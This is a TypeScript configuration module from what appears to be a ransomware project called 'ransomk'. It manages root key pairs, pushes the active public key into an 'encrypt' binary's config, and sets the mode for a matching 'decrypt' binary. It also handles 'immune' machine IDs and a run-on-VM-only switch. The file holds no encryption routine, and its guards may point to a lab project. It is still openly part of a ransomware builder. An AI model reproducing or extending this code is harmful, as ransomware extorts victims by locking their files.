import path from "node:path";
import fs from "node:fs";
import {
  RansomDirMode,
  SAFE_RANSOM_DIR_MODE,
  getMachineId,
} from "ransomkcommon";

export type RootKeyPair = {
  rootPrivateKey: string;
  rootPublicKey: string;
};

export type RootConfig = {
  active?: RootKeyPair;
  immuneMachineIds: string[];
  runOnVmOnly: boolean;
  keys: {
    [key: string]: RootKeyPair;
  };
  mode: RansomDirMode;
};

const ROOT_CONFIG_FILE = "ransomk.root.config.json";

export function readJsonFile<T>(path: string): Partial<T> {
  try {
    return JSON.parse(
      fs.readFileSync(path, { encoding: "utf8" })
    ) as Partial<T>;
  } catch (e) {
    return {};
  }
}

export function writeJsonFile(path: string, data: any): void {
  fs.writeFileSync(path, JSON.stringify(data, null, 2), { encoding: "utf8" });
}

export const GLOBAL_CONFIG_FILE_PATH = path.join(
  __dirname,
  "..",
  ROOT_CONFIG_FILE
);

export const ENCRYPT_BIN_CONFIG_FILE_PATH = path.join(
  __dirname,
  "..",
  "..",
  "encrypt",
  "ransomk.encrypt.config.json"
);

export const DECRYPT_BIN_CONFIG_FILE_PATH = path.join(
  __dirname,
  "..",
  "..",
  "decrypt",
  "ransomk.decrypt.config.json"
);

export type AsyncReducer<T> = (getCurrentConfig: () => T) => Promise<T>;

export type ConfigReducer = AsyncReducer<Partial<RootConfig>>;

export function withDefaultConfig(reducer: ConfigReducer): ConfigReducer {
  return async (getCurrentConfig: () => Partial<RootConfig>) => {
    const config = { ...getCurrentConfig() };

    if (typeof config.mode !== "string") {
      config.mode = SAFE_RANSOM_DIR_MODE;
    }

    if (typeof config.immuneMachineIds === "undefined") {
      config.immuneMachineIds = [await getMachineId()];
    }

    return await reducer(getCurrentConfig);
  };
}

export function readCurrentRootConfig() {
  return readJsonFile<RootConfig>(GLOBAL_CONFIG_FILE_PATH);
}

export async function setCurrentImmuneMachineIds(
  reducer: AsyncReducer<string[]>
) {
  const currentImmuneMachineIds =
    readCurrentRootConfig().immuneMachineIds ?? [];

  await modifyCurrentRootConfig(async (getCurrentConfig) => {
    const immuneMachineIds = await reducer(() => currentImmuneMachineIds);

    writeJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH, {
      ...readJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH),
      immuneMachineIds,
    });

    return {
      ...getCurrentConfig(),
      immuneMachineIds,
    };
  });
}

export async function setRunOnVmOnlyOption(runOnVmOnly: boolean) {
  await modifyCurrentRootConfig(async (getCurrentConfig) => {
    return {
      ...getCurrentConfig(),
      runOnVmOnly,
    };
  });

  writeJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH, {
    ...readJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH),
    runOnVmOnly,
  });
}

export async function setCurrentActiveRootKeyPair(
  rootKeyPair: RootKeyPair | undefined,
  mode: RansomDirMode | undefined
) {
  mode = mode ?? SAFE_RANSOM_DIR_MODE;

  if (rootKeyPair === undefined) {
    await modifyCurrentRootConfig(async (getCurrentConfig) => {
      const config = { ...getCurrentConfig() };

      delete config.active;

      return config;
    });

    writeJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH, {
      ...readJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH),
      rootPublicKey: undefined,
      mode: mode,
    });

    writeJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH, {
      ...readJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH),
      mode: mode,
    });
  } else {
    await modifyCurrentRootConfig(async (getCurrentConfig) => {
      return { ...getCurrentConfig(), ...rootKeyPair, mode };
    });

    writeJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH, {
      ...readJsonFile(ENCRYPT_BIN_CONFIG_FILE_PATH),
      rootPublicKey: rootKeyPair.rootPublicKey,
      mode: mode,
    });

    writeJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH, {
      ...readJsonFile(DECRYPT_BIN_CONFIG_FILE_PATH),
      mode: mode,
    });
  }
}

export async function modifyCurrentRootConfig(
  reducer: ConfigReducer
): Promise<void> {
  const globalConfig = await reducer(() => readCurrentRootConfig());

  writeJsonFile(GLOBAL_CONFIG_FILE_PATH, globalConfig);
}
